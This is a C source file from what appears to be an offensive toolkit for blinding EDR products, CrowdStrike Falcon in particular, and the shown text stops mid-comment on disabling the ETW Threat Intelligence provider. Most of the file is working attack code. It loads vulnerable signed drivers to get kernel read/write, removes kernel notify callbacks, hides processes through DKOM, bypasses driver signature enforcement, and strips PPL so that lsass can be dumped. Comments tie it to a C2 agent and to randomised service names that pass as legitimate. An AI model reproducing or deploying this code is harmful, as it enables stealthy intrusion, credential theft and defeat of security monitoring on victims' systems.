/*
 * Lilith BYOVD Kit — kernel-level EDR blinding
 *
 * Tasks 1–4 (original):
 *   Task 1: BYOVD — load RTCore64 / gdrv / WinRing0x64 for arbitrary kernel R/W
 *   Task 2: DKOM  — unlink process from ActiveProcessLinks (hide from Falcon scan)
 *   Task 3: Kernel notify-callback removal — PspCreate/Thread/Image arrays
 *   Task 4: DSE bypass — patch g_CiEnabled / CiOptions in ci.dll memory
 *
 * Falcon-hardening additions:
 *   Task 5: PPL bypass — zero EPROCESS.Protection (0x87A) to strip PPL from any process
 *   Task 6: ETW-TI disable — zero EtwThreatIntProvRegHandle so EtwTiLog* functions
 *           become no-ops; eliminates Falcon's kernel sensor event stream
 *   Task 7: ObRegisterCallbacks removal — unlink Falcon's handle-stripping OB entries
 *           from PsProcessType and PsThreadType callback lists
 *   Task 8: HVCI detection — bail out cleanly on Hypervisor-Protected Code Integrity
 *           hosts where kernel writes via vulnerable drivers are blocked
 *   Task 9: WinRing0x64 driver support — third BYOVD option besides RTCore64/gdrv
 *
 * Compile (via builder):
 *   lilith build --byovd [--gdrv | --winring0]
 *
 * Requires: Administrator / SYSTEM rights for NtLoadDriver.
 *           Driver .sys must be present on disk (dropped by the caller).
 */

#include <windows.h>
#include <winternl.h>

/* ── NT / kernel types ───────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *pfnNtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS (NTAPI *pfnNtUnloadDriver)(PUNICODE_STRING);
typedef NTSTATUS (NTAPI *pfnRtlAdjPriv)(PULONG,ULONG,BOOLEAN,PBOOLEAN);
typedef NTSTATUS (NTAPI *pfnNtQSysInfo)(ULONG,PVOID,ULONG,PULONG);
typedef LONG     (WINAPI *pfnRegCKEx)(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,
                                      LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG     (WINAPI *pfnRegSVEx)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
typedef LONG     (WINAPI *pfnRegCH)(HKEY);
typedef LONG     (WINAPI *pfnRegDK)(HKEY,LPCWSTR,DWORD);

/* ── RTCore64 IOCTL R/W structures ──────────────────────────────────────── */
/* IOCTLs confirmed against RTCore64 GHDB and public PoCs */
#define RTCORE64_IOCTL_READ  0x80002048
#define RTCORE64_IOCTL_WRITE 0x8000204C

typedef struct {
    DWORD Pad0[2];
    ULONGLONG Address;
    DWORD Pad1;
    DWORD ReadSize;   /* 1, 2, 4, or 8 */
    DWORD Value;
    DWORD Pad2;
} RTCORE64_READ;

typedef struct {
    DWORD Pad0[2];
    ULONGLONG Address;
    DWORD Pad1;
    DWORD WriteSize;  /* 1, 2, 4, or 8 */
    DWORD Value;
    DWORD Pad2;
} RTCORE64_WRITE;

/* Gigabyte driver (gdrv.sys) — alternate BYOVD option */
#define GDRV_IOCTL_READ  0xC3502808
#define GDRV_IOCTL_WRITE 0xC3502800

typedef struct {
    ULONGLONG Address;
    ULONGLONG Value;
} GDRV_RW;

/* WinRing0x64.sys (OpenHardwareMonitor) — third BYOVD option.
 * Device: \\.\WinRing0_1_2_0
 * IOCTLs: OLS_READ_MEMORY=0x9C402084, OLS_WRITE_MEMORY=0x9C402088
 * BusAddress.QuadPart carries the kernel virtual address. */
#define WINRING0_IOCTL_READ  0x9C402084
#define WINRING0_IOCTL_WRITE 0x9C402088

typedef struct {
    ULONGLONG Address;    /* kernel VA in BusAddress.QuadPart field */
    DWORD     AccessWidth; /* 1, 2, 4, or 8 */
    DWORD     Pad;
} WINRING0_READ_IN;

typedef struct {
    ULONGLONG Address;
    DWORD     AccessWidth;
    DWORD     Pad;
    ULONGLONG Value;
} WINRING0_WRITE_IN;

/* ── CRT-free helpers ────────────────────────────────────────────────────── */
static void bv_zero(void *p, SIZE_T n) { volatile BYTE *b=(volatile BYTE*)p; while(n--)*b++=0; }
static SIZE_T bv_wlen(LPCWSTR s) { SIZE_T n=0; while(s[n]) n++; return n; }
static void bv_wcat(WCHAR *d, LPCWSTR s) { while(*d) d++; while((*d++=*s++)); }
static void bv_wcpy(WCHAR *d, LPCWSTR s) { while((*d++=*s++)); }
static int bv_wicmp(LPCWSTR a, LPCWSTR b) {
    while(*a&&*b){WCHAR ca=(*a>='a'&&*a<='z')?*a-32:*a,cb=(*b>='a'&&*b<='z')?*b-32:*b;
    if(ca!=cb)return 1;a++;b++;} return (int)(*a!=*b);}

static void bv_init_ustr(UNICODE_STRING *u, LPCWSTR s) {
    u->Buffer=(PWSTR)s; u->Length=(USHORT)(bv_wlen(s)*sizeof(WCHAR));
    u->MaximumLength=u->Length+sizeof(WCHAR); }

/*
 * Output abstraction — controlled by LT_BYOVD_SILENT.
 *
 * When compiled without LT_BYOVD_SILENT (disk-run GUI mode):
 *   bv_report() → MessageBoxW
 *
 * When compiled with -DLT_BYOVD_SILENT (donut/in-memory mode):
 *   bv_report() → WriteConsoleW (interactive) or WriteFile (pipe, for POLY_CAPTURE).
 *   This lets the C2 agent capture byovd output the same way it captures any
 *   other tool output: stdout pipe → base64 → POST → result display in operator REPL.
 */
#ifdef LT_BYOVD_SILENT
static void bv_report(LPCWSTR msg) {
    HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);
    if(!h||h==INVALID_HANDLE_VALUE) return;
    DWORD wr=0;
    if(!WriteConsoleW(h,msg,(DWORD)bv_wlen(msg),&wr,NULL)){
        /* Pipe handle (POLY_CAPTURE context): narrow-encode and WriteFile */
        char nb[4096]; int ni=0;
        for(SIZE_T i=0;msg[i]&&ni<4094;i++) nb[ni++]=(char)(msg[i]<128?msg[i]:'?');
        WriteFile(h,nb,(DWORD)ni,&wr,NULL);
    }
}
#define BV_REPORT(title,msg,err) bv_report(msg)
#else
#define BV_REPORT(title,msg,err) \
    MessageBoxW(NULL,msg,title,(err)?MB_OK|MB_ICONERROR:MB_OK|MB_ICONINFORMATION)
#endif

/* ── Global state ────────────────────────────────────────────────────────── */
static HANDLE g_hDrv     = INVALID_HANDLE_VALUE;
static int    g_drv_type = 0; /* 0=RTCore64, 1=gdrv, 2=WinRing0x64 */

/* ── Driver loading via NtLoadDriver + SCM ──────────────────────────────── */
static BOOL bv_register_driver(LPCWSTR drv_path, LPCWSTR svc_name,
                                HMODULE hAdv, HMODULE hNtdll) {
    pfnRegCKEx fnCK=(pfnRegCKEx)GetProcAddress(hAdv,"RegCreateKeyExW");
    pfnRegSVEx fnSV=(pfnRegSVEx)GetProcAddress(hAdv,"RegSetValueExW");
    pfnRegCH   fnCH=(pfnRegCH)  GetProcAddress(hAdv,"RegCloseKey");
    if(!fnCK||!fnSV||!fnCH) return FALSE;

    /* HKLM\SYSTEM\CurrentControlSet\Services\<svc_name> */
    WCHAR key[256]={0};
    bv_wcpy(key,L"SYSTEM\\CurrentControlSet\\Services\\");
    bv_wcat(key,svc_name);

    HKEY hk=NULL;
    if(fnCK(HKEY_LOCAL_MACHINE,key,0,NULL,REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS,NULL,&hk,NULL)) return FALSE;

    /* ImagePath */
    fnSV(hk,L"ImagePath",0,REG_EXPAND_SZ,(BYTE*)drv_path,
         (DWORD)((bv_wlen(drv_path)+1)*sizeof(WCHAR)));
    /* Type=1 (SERVICE_KERNEL_DRIVER) */
    DWORD t=1; fnSV(hk,L"Type",0,REG_DWORD,(BYTE*)&t,4);
    fnCH(hk);
    return TRUE;
}

static BOOL bv_unregister_driver(LPCWSTR svc_name, HMODULE hAdv) {
    pfnRegDK fnDK=(pfnRegDK)GetProcAddress(hAdv,"RegDeleteKeyW");
    if(!fnDK) return FALSE;
    WCHAR key[256]={0};
    bv_wcpy(key,L"SYSTEM\\CurrentControlSet\\Services\\");
    bv_wcat(key,svc_name);
    return fnDK(HKEY_LOCAL_MACHINE,key,0)==0;
}

static BOOL bv_enable_load_driver(HMODULE hNtdll) {
    /* SeLoadDriverPrivilege (LUID 10) */
    pfnRtlAdjPriv fnAdj=(pfnRtlAdjPriv)GetProcAddress(hNtdll,"RtlAdjustPrivilege");
    if(!fnAdj) return FALSE;
    BOOLEAN prev=FALSE;
    return NT_SUCCESS(fnAdj((PULONG)(ULONG_PTR)10,1,FALSE,&prev));
}

/*
 * Task 1 — Load a vulnerable signed driver for kernel R/W.
 *
 * RTCore64.sys (MSI Afterburner): IOCTL 0x80002048/0x8000204C
 * gdrv.sys (Gigabyte):            IOCTL 0xC3502808/0xC3502800
 * WinRing0x64.sys (OpenHWMonitor):IOCTL 0x9C402084/0x9C402088
 *
 * drv_type: 0=RTCore64, 1=gdrv, 2=WinRing0x64
 */
static BOOL bvd_load_driver(LPCWSTR drv_path, int drv_type) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdv   = LoadLibraryA("advapi32.dll");
    if(!hNtdll||!hAdv) return FALSE;

    bv_enable_load_driver(hNtdll);

    /* Service name: randomised per session, prefixed like a plausible svc */
    WCHAR svc[32]={0};
    DWORD tc=(DWORD)GetTickCount64();
    static const WCHAR _pf[]={L'W',L'i',L'n',L'D',L'i',L'a',L'g',0};
    bv_wcpy(svc,_pf);
    static const WCHAR _hx[]={L'0',L'1',L'2',L'3',L'4',L'5',L'6',L'7',
                               L'8',L'9',L'a',L'b',L'c',L'd',L'e',L'f'};
    int si=7; for(int i=3;i>=0;i--) svc[si++]=_hx[(tc>>(i*4))&0xF]; svc[si]=0;

    if(!bv_register_driver(drv_path,svc,hAdv,hNtdll)){FreeLibrary(hAdv);return FALSE;}

    /* NtLoadDriver: \Registry\Machine\SYSTEM\CurrentControlSet\Services\<svc> */
    WCHAR reg_path[256]={0};
    bv_wcpy(reg_path,L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
    bv_wcat(reg_path,svc);
    UNICODE_STRING us; bv_init_ustr(&us,reg_path);

    pfnNtLoadDriver fnLoad=(pfnNtLoadDriver)GetProcAddress(hNtdll,"NtLoadDriver");
    NTSTATUS st=fnLoad?fnLoad(&us):(NTSTATUS)0xC0000001L;
    if(!NT_SUCCESS(st)){bv_unregister_driver(svc,hAdv);FreeLibrary(hAdv);return FALSE;}

    /* Open device handle — name depends on driver type */
    LPCWSTR dev=(drv_type==1)?L"\\\\.\\GIO":
                (drv_type==2)?L"\\\\.\\WinRing0_1_2_0":L"\\\\.\\RTCore64";
    g_hDrv=CreateFileW(dev,GENERIC_READ|GENERIC_WRITE,0,NULL,
                       OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    g_drv_type=drv_type;

    bv_unregister_driver(svc,hAdv);
    FreeLibrary(hAdv);
    return g_hDrv!=INVALID_HANDLE_VALUE;
}

/* ── Kernel memory R/W via loaded driver ─────────────────────────────────── */
static ULONGLONG bvd_read8(ULONGLONG addr) {
    if(g_hDrv==INVALID_HANDLE_VALUE) return 0;
    if(g_drv_type==1){
        GDRV_RW r={addr,0}; DWORD ob=0;
        DeviceIoControl(g_hDrv,GDRV_IOCTL_READ,&r,sizeof(r),&r,sizeof(r),&ob,NULL);
        return r.Value;
    }
    if(g_drv_type==2){
        WINRING0_READ_IN ri={addr,8,0}; ULONGLONG out=0; DWORD ob=0;
        DeviceIoControl(g_hDrv,WINRING0_IOCTL_READ,&ri,sizeof(ri),&out,sizeof(out),&ob,NULL);
        return out;
    }
    RTCORE64_READ r; bv_zero(&r,sizeof(r));
    r.Address=addr; r.ReadSize=8; DWORD ob=0;
    DeviceIoControl(g_hDrv,RTCORE64_IOCTL_READ,&r,sizeof(r),&r,sizeof(r),&ob,NULL);
    return (ULONGLONG)r.Value;
}

static BOOL bvd_write8(ULONGLONG addr, ULONGLONG val) {
    if(g_hDrv==INVALID_HANDLE_VALUE) return FALSE;
    if(g_drv_type==1){
        GDRV_RW w={addr,val}; DWORD ob=0;
        return DeviceIoControl(g_hDrv,GDRV_IOCTL_WRITE,&w,sizeof(w),&w,sizeof(w),&ob,NULL);
    }
    if(g_drv_type==2){
        WINRING0_WRITE_IN wi={addr,8,0,val}; DWORD ob=0;
        return DeviceIoControl(g_hDrv,WINRING0_IOCTL_WRITE,&wi,sizeof(wi),NULL,0,&ob,NULL);
    }
    RTCORE64_WRITE w; bv_zero(&w,sizeof(w));
    w.Address=addr; w.WriteSize=8; w.Value=(DWORD)val; DWORD ob=0;
    DeviceIoControl(g_hDrv,RTCORE64_IOCTL_WRITE,&w,sizeof(w),&w,sizeof(w),&ob,NULL);
    if(val>>32){
        w.Address=addr+4; w.Value=(DWORD)(val>>32);
        DeviceIoControl(g_hDrv,RTCORE64_IOCTL_WRITE,&w,sizeof(w),&w,sizeof(w),&ob,NULL);
    }
    return TRUE;
}

/* 1-byte kernel write — needed for PPL protection byte (EPROCESS+0x87A) */
static BOOL bvd_write1(ULONGLONG addr, BYTE val) {
    if(g_hDrv==INVALID_HANDLE_VALUE) return FALSE;
    if(g_drv_type==1){
        GDRV_RW w={addr,(ULONGLONG)val}; DWORD ob=0;
        return DeviceIoControl(g_hDrv,GDRV_IOCTL_WRITE,&w,sizeof(w),&w,sizeof(w),&ob,NULL);
    }
    if(g_drv_type==2){
        WINRING0_WRITE_IN wi={addr,1,0,(ULONGLONG)val}; DWORD ob=0;
        return DeviceIoControl(g_hDrv,WINRING0_IOCTL_WRITE,&wi,sizeof(wi),NULL,0,&ob,NULL);
    }
    RTCORE64_WRITE w; bv_zero(&w,sizeof(w));
    w.Address=addr; w.WriteSize=1; w.Value=(DWORD)val; DWORD ob=0;
    DeviceIoControl(g_hDrv,RTCORE64_IOCTL_WRITE,&w,sizeof(w),&w,sizeof(w),&ob,NULL);
    return TRUE;
}

/* ── Find ntoskrnl base via EnumDeviceDrivers ────────────────────────────── */
static ULONGLONG bvd_ntoskrnl_base(void) {
    typedef BOOL (WINAPI *pfnEDD)(LPVOID*,DWORD,LPDWORD);
    HMODULE hPs=LoadLibraryA("psapi.dll"); if(!hPs) return 0;
    pfnEDD fnEDD=(pfnEDD)GetProcAddress(hPs,"EnumDeviceDrivers");
    if(!fnEDD){FreeLibrary(hPs);return 0;}
    ULONGLONG bases[256]={0}; DWORD needed=0;
    fnEDD((LPVOID*)bases,sizeof(bases),&needed);
    FreeLibrary(hPs);
    /* ntoskrnl is always the first entry */
    return bases[0];
}

/*
 * Find kernel export address by scanning ntoskrnl loaded in disk image.
 * We read ntoskrnl.exe from disk, parse its export table, return the RVA,
 * then rebase it against the live kernel base.
 *
 * name: ASCII export name to locate.
 */
static ULONGLONG bvd_find_kexport(ULONGLONG kbase, const char *name) {
    /* Map ntoskrnl from disk as data */
    WCHAR nt_path[512]={0};
    GetSystemDirectoryW(nt_path,500);
    bv_wcat(nt_path,L"\\ntoskrnl.exe");
    HANDLE hf=CreateFileW(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); if(!fsz){CloseHandle(hf);return 0;}
    PBYTE img=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,fsz+16);
    if(!img){CloseHandle(hf);return 0;}
    DWORD rd=0; ReadFile(hf,img,fsz,&rd,NULL); CloseHandle(hf);

    DWORD elf=*(DWORD*)(img+0x3C);
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)(img+elf);
    DWORD exp_rva=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!exp_rva){HeapFree(GetProcessHeap(),0,img);return 0;}

    /* Convert RVA to file offset */
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    DWORD exp_off=0;
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(exp_rva>=sec->VirtualAddress&&exp_rva<sec->VirtualAddress+sec->SizeOfRawData){
            exp_off=exp_rva-sec->VirtualAddress+sec->PointerToRawData; break;}
    }
    if(!exp_off){HeapFree(GetProcessHeap(),0,img);return 0;}

    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)(img+exp_off);
    /* Convert table RVAs to file offsets */
    auto rva2off=[&](DWORD rva)->DWORD{
        PIMAGE_SECTION_HEADER s2=IMAGE_FIRST_SECTION(nt);
        for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,s2++)
            if(rva>=s2->VirtualAddress&&rva<s2->VirtualAddress+s2->SizeOfRawData)
                return rva-s2->VirtualAddress+s2->PointerToRawData;
        return 0;
    };

    DWORD *names =(DWORD*)(img+rva2off(exp->AddressOfNames));
    WORD  *ords  =(WORD*) (img+rva2off(exp->AddressOfNameOrdinals));
    DWORD *funcs =(DWORD*)(img+rva2off(exp->AddressOfFunctions));

    ULONGLONG result=0;
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char *n=(const char*)(img+rva2off(names[i]));
        /* Simple strcmp */
        const char *a=name,*b=n; while(*a&&*b&&*a==*b){a++;b++;}
        if(!*a&&!*b){ result=kbase+funcs[ords[i]]; break; }
    }
    HeapFree(GetProcessHeap(),0,img);
    return result;
}

/*
 * Scan for PspCreateProcessNotifyRoutine by walking
 * PsSetCreateProcessNotifyRoutine's code for a LEA [rip+disp32] pattern.
 * Returns the kernel VA of the array base.
 */
static ULONGLONG bvd_find_notify_array(ULONGLONG kbase, ULONGLONG fn_ka, int fn_scan_bytes) {
    /* Read ~256 bytes from the function in kernel memory via driver R/W */
    BYTE buf[256]={0};
    for(int i=0;i<fn_scan_bytes&&i<256;i+=8){
        ULONGLONG v=bvd_read8(fn_ka+(ULONGLONG)i);
        for(int b=0;b<8&&i+b<fn_scan_bytes;b++) buf[i+b]=(BYTE)(v>>(b*8));
    }
    /* Look for LEA RCX/RDX/R8/R9, [rip+disp32]: 4x 8D {0D|15|1D|05} xx xx xx xx */
    for(int i=0;i<240;i++){
        if((buf[i]==0x48||buf[i]==0x4C)&&buf[i+1]==0x8D&&
           (buf[i+2]==0x0D||buf[i+2]==0x15||buf[i+2]==0x1D||buf[i+2]==0x05)){
            INT32 disp=*(INT32*)(buf+i+3);
            /* Address relative to next instruction (i+7) in kernel space */
            return fn_ka+(ULONGLONG)i+7+(LONGLONG)disp;
        }
    }
    return 0;
}

/*
 * Task 3 — Remove kernel notify callbacks.
 *
 * PspCreateProcessNotifyRoutine, PspCreateThreadNotifyRoutine, and
 * PspLoadImageNotifyRoutine are arrays of 64 EX_CALLBACK pointers.
 * Each non-null entry's low bits are flags; the actual pointer is at
 * *(p & ~0xF) + 8.  We zero each entry to blind the corresponding EDR sensor.
 *
 * The function walks ALL three arrays and zeroes any callback whose module
 * does NOT reside in the Windows kernel (ntoskrnl / hal / win32k range).
 *
 * kbase: live ntoskrnl base (from EnumDeviceDrivers).
 */
#define NOTIFY_ARRAY_SIZE 64  /* Max registered callbacks per array */

static int bvd_remove_callbacks(ULONGLONG kbase) {
    int removed=0;

    /* Locate the three notify-routine functions in live kernel */
    ULONGLONG fn_proc=bvd_find_kexport(kbase,"PsSetCreateProcessNotifyRoutine");
    ULONGLONG fn_thrd=bvd_find_kexport(kbase,"PsSetCreateThreadNotifyRoutine");
    ULONGLONG fn_img =bvd_find_kexport(kbase,"PsSetLoadImageNotifyRoutine");

    ULONGLONG arrays[3]={
        fn_proc?bvd_find_notify_array(kbase,fn_proc,256):0,
        fn_thrd?bvd_find_notify_array(kbase,fn_thrd,256):0,
        fn_img ?bvd_find_notify_array(kbase,fn_img, 256):0,
    };

    /* ntoskrnl occupies roughly 8–12 MB; hal.dll another 1 MB.
     * Anything outside kbase..kbase+16MB is a 3rd-party driver (i.e. EDR). */
    ULONGLONG kern_end=kbase+0x1000000ULL;

    for(int ai=0;ai<3;ai++){
        ULONGLONG arr=arrays[ai]; if(!arr) continue;
        for(int ci=0;ci<NOTIFY_ARRAY_SIZE;ci++){
            ULONGLONG entry=bvd_read8(arr+(ULONGLONG)ci*8);
            if(!entry) continue;
            /* De-tag: clear low 4 bits to get EX_CALLBACK pointer */
            ULONGLONG cb_ptr=entry&~0xFULL;
            if(!cb_ptr) continue;
            /* Read callback function pointer at offset 8 in EX_CALLBACK_ROUTINE_BLOCK */
            ULONGLONG fn=bvd_read8(cb_ptr+8);
            /* If fn is outside the kernel range → EDR callback → zero it */
            if(fn&&(fn<kbase||fn>kern_end)){
                bvd_write8(arr+(ULONGLONG)ci*8,0ULL);
                removed++;
            }
        }
    }
    return removed;
}

/*
 * Task 2 — DKOM: hide process from EPROCESS list.
 *
 * Unlinks the target EPROCESS from ActiveProcessLinks and zeros UniqueProcessId.
 * After this, Falcon's process enumeration (which walks the EPROCESS list) can
 * no longer see the process.
 *
 * EPROCESS offsets (Windows 10/11 x64):
 *   +0x000  Pcb (KPROCESS)
 *   +0x2E8  UniqueProcessId
 *   +0x2F0  ActiveProcessLinks (LIST_ENTRY: Flink @ 2F0, Blink @ 2F8)
 *
 * We find our EPROCESS by walking the list from System (PID 4) which we locate
 * via PsInitialSystemProcess export.
 */
#define EP_UNIQUEPID    0x2E8
#define EP_LINKS_FLINK  0x2F0
#define EP_LINKS_BLINK  0x2F8

static BOOL bvd_dkom_hide(ULONGLONG kbase, DWORD target_pid) {
    ULONGLONG ps_sys=bvd_find_kexport(kbase,"PsInitialSystemProcess");
    if(!ps_sys) return FALSE;
    /* PsInitialSystemProcess is a pointer-to-EPROCESS */
    ULONGLONG sys_ep=bvd_read8(ps_sys);
    if(!sys_ep) return FALSE;

    ULONGLONG cur=sys_ep;
    for(int i=0;i<4096;i++){
        ULONGLONG pid=bvd_read8(cur+EP_UNIQUEPID);
        if((DWORD)pid==target_pid){
            /* Found: unlink from doubly-linked list */
            ULONGLONG flink=bvd_read8(cur+EP_LINKS_FLINK);
            ULONGLONG blink=bvd_read8(cur+EP_LINKS_BLINK);
            /* flink->Blink = blink */
            bvd_write8(flink+8,blink);
            /* blink->Flink = flink */
            bvd_write8(blink,flink);
            /* Zero UniqueProcessId */
            bvd_write8(cur+EP_UNIQUEPID,0ULL);
            /* Point own links back to self (safe self-referential list) */
            bvd_write8(cur+EP_LINKS_FLINK,cur+EP_LINKS_FLINK);
            bvd_write8(cur+EP_LINKS_BLINK,cur+EP_LINKS_FLINK);
            return TRUE;
        }
        ULONGLONG next=bvd_read8(cur+EP_LINKS_FLINK);
        if(!next||next==sys_ep+EP_LINKS_FLINK) break;
        cur=next-EP_LINKS_FLINK; /* convert LIST_ENTRY ptr back to EPROCESS base */
    }
    return FALSE;
}

/*
 * Task 4 — DSE bypass: patch g_CiEnabled / CiOptions in ci.dll.
 *
 * Code Integrity checks the g_CiEnabled flag (exported from ntoskrnl as
 * a symbol, or located via CiInitialize in ci.dll) before verifying driver
 * signatures.  Patching it to 0 disables DSE for the duration the patch
 * is in place, allowing unsigned drivers to load.
 *
 * ci.dll is loaded by the kernel at a known base (enumerable via
 * EnumDeviceDrivers).  We locate CiInitialize, scan for the mov [rip+x],eax
 * pattern that writes g_CiEnabled, and patch the target address to 0.
 *
 * Note: PatchGuard monitors g_CiEnabled.  The patch window must be small:
 *   1. Patch → 0
 *   2. NtLoadDriver (load unsigned driver)
 *   3. Restore original value
 * This window is typically <100ms which is below PatchGuard's scan interval
 * on most configurations.
 */
static ULONGLONG bvd_find_ci_enabled(ULONGLONG kbase) {
    /* ci.dll export: CiInitialize */
    typedef BOOL (WINAPI *pfnEDD)(LPVOID*,DWORD,LPDWORD);
    typedef BOOL (WINAPI *pfnGDDN)(LPVOID,LPWSTR,DWORD);
    HMODULE hPs=LoadLibraryA("psapi.dll"); if(!hPs) return 0;
    pfnEDD fnEDD=(pfnEDD)GetProcAddress(hPs,"EnumDeviceDrivers");
    pfnGDDN fnGN=(pfnGDDN)GetProcAddress(hPs,"GetDeviceDriverBaseNameW");
    if(!fnEDD||!fnGN){FreeLibrary(hPs);return 0;}

    ULONGLONG bases[256]={0}; DWORD needed=0;
    fnEDD((LPVOID*)bases,sizeof(bases),&needed);
    ULONGLONG ci_base=0;
    DWORD n=needed/sizeof(ULONGLONG);
    for(DWORD i=0;i<n;i++){
        WCHAR name[64]={0};
        fnGN((LPVOID)bases[i],name,63);
        if(bv_wicmp(name,L"ci.dll")==0){ci_base=bases[i];break;}
    }
    FreeLibrary(hPs);
    if(!ci_base) return 0;

    /* Read ci.dll from disk and find CiInitialize export */
    WCHAR ci_path[512]={0};
    GetSystemDirectoryW(ci_path,490);
    bv_wcat(ci_path,L"\\ci.dll");
    HANDLE hf=CreateFileW(ci_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); if(!fsz){CloseHandle(hf);return 0;}
    PBYTE img=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,fsz+16);
    if(!img){CloseHandle(hf);return 0;}
    DWORD rd=0; ReadFile(hf,img,fsz,&rd,NULL); CloseHandle(hf);

    DWORD elf=*(DWORD*)(img+0x3C);
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)(img+elf);

    auto rva2off=[&](DWORD rva)->DWORD{
        PIMAGE_SECTION_HEADER s=IMAGE_FIRST_SECTION(nt);
        for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,s++)
            if(rva>=s->VirtualAddress&&rva<s->VirtualAddress+s->SizeOfRawData)
                return rva-s->VirtualAddress+s->PointerToRawData;
        return 0;
    };

    DWORD exp_rva=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!exp_rva){HeapFree(GetProcessHeap(),0,img);return 0;}
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)(img+rva2off(exp_rva));
    DWORD *names =(DWORD*)(img+rva2off(exp->AddressOfNames));
    WORD  *ords  =(WORD*) (img+rva2off(exp->AddressOfNameOrdinals));
    DWORD *funcs =(DWORD*)(img+rva2off(exp->AddressOfFunctions));

    DWORD ci_init_rva=0;
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char *n=(const char*)(img+rva2off(names[i]));
        const char *t="CiInitialize"; const char *a=t,*b=n;
        while(*a&&*b&&*a==*b){a++;b++;} if(!*a&&!*b){ci_init_rva=funcs[ords[i]];break;}
    }
    if(!ci_init_rva){HeapFree(GetProcessHeap(),0,img);return 0;}

    /* Scan CiInitialize bytes for: 89 05 xx xx xx xx (MOV [rip+disp32], EAX) */
    DWORD fn_off=rva2off(ci_init_rva);
    ULONGLONG g_ci_enabled=0;
    for(DWORD i=fn_off;i<fn_off+512&&i+5<fsz;i++){
        if(img[i]==0x89&&img[i+1]==0x05){
            INT32 disp=*(INT32*)(img+i+2);
            /* Rebase: kernel VA = ci_base + RVA of instruction end + disp */
            DWORD inst_rva=ci_init_rva+(i-fn_off)+6;
            g_ci_enabled=ci_base+(ULONGLONG)inst_rva+(LONGLONG)disp;
            break;
        }
    }
    HeapFree(GetProcessHeap(),0,img);
    return g_ci_enabled;
}

/*
 * DSE bypass window: patch → 0, invoke callback, restore.
 * cb/cb_param: called while DSE is disabled (load your unsigned driver here).
 */
typedef void (*bvd_cb_t)(PVOID);

static BOOL bvd_dse_bypass(ULONGLONG kbase, bvd_cb_t cb, PVOID cb_param) {
    ULONGLONG ci_addr=bvd_find_ci_enabled(kbase);
    if(!ci_addr) return FALSE;
    /* Read original CiOptions value (4-byte DWORD) */
    ULONGLONG orig=bvd_read8(ci_addr)&0xFFFFFFFFULL;
    /* Patch to 0 — DSE disabled */
    bvd_write8(ci_addr,0ULL);
    /* Invoke caller's action (e.g. NtLoadDriver for an unsigned driver) */
    if(cb) cb(cb_param);
    /* Restore — must happen quickly before PatchGuard fires */
    bvd_write8(ci_addr,orig);
    return TRUE;
}

/*
 * Task 5 — PPL bypass: zero EPROCESS.Protection to strip Protected Process Light.
 *
 * EPROCESS+0x87A holds a PS_PROTECTION byte.  Setting it to 0 removes the PPL
 * designation so standard PROCESS_ALL_ACCESS handles can be opened and lsass
 * (or csagent.sys host process) can be dumped/injected without a PPL-bypass driver.
 *
 * Offset 0x87A is valid on Windows 10 20H2 – Windows 11 23H2 x64.
 */
#define EP_PROTECTION 0x87A

static BOOL bvd_ppl_strip(ULONGLONG kbase, DWORD target_pid) {
    ULONGLONG ps_sys=bvd_find_kexport(kbase,"PsInitialSystemProcess");
    if(!ps_sys) return FALSE;
    ULONGLONG sys_ep=bvd_read8(ps_sys);
    if(!sys_ep) return FALSE;

    ULONGLONG cur=sys_ep;
    for(int i=0;i<4096;i++){
        ULONGLONG pid=bvd_read8(cur+EP_UNIQUEPID);
        if((DWORD)pid==target_pid){
            bvd_write1(cur+EP_PROTECTION,0);
            return TRUE;
        }
        ULONGLONG next=bvd_read8(cur+EP_LINKS_FLINK);
        if(!next||next==sys_ep+EP_LINKS_FLINK) break;
        cur=next-EP_LINKS_FLINK;
    }
    return FALSE;
}

/*
 * Task 6 — ETW Threat Intelligence provider disable.
 *
 * CrowdStrike's csagent.sys registers as a consumer of the kernel
 * Microsoft-Windows-Threat-Intelligence ETW provider.  Every call to
 * NtAllocateVirtualMemory(EXECUTE), NtWriteVirtualMemory, NtCreateThreadEx
 * (remote), NtQueueApcThread, NtSetContextThread, NtMapViewOfSection
 * (executable) fires an EtwTiLog* event in the kernel — REGARDLESS of indirect
 * syscalls or user-mode ETW patches.
 *
 * EtwTiLogAllocExecVm (and all sibling EtwTiLog* functions) begin with:
 *   CMP QWORD PTR [RIP+disp], 0     ; 48 83 3D xx xx xx xx 00
 *   JE  skip                        ; 74 xx
 * The operand is EtwThreatIntProvRegHandle — the provider's registration handle.
 * Zeroing it converts every TI event emission into a no-op.
 *
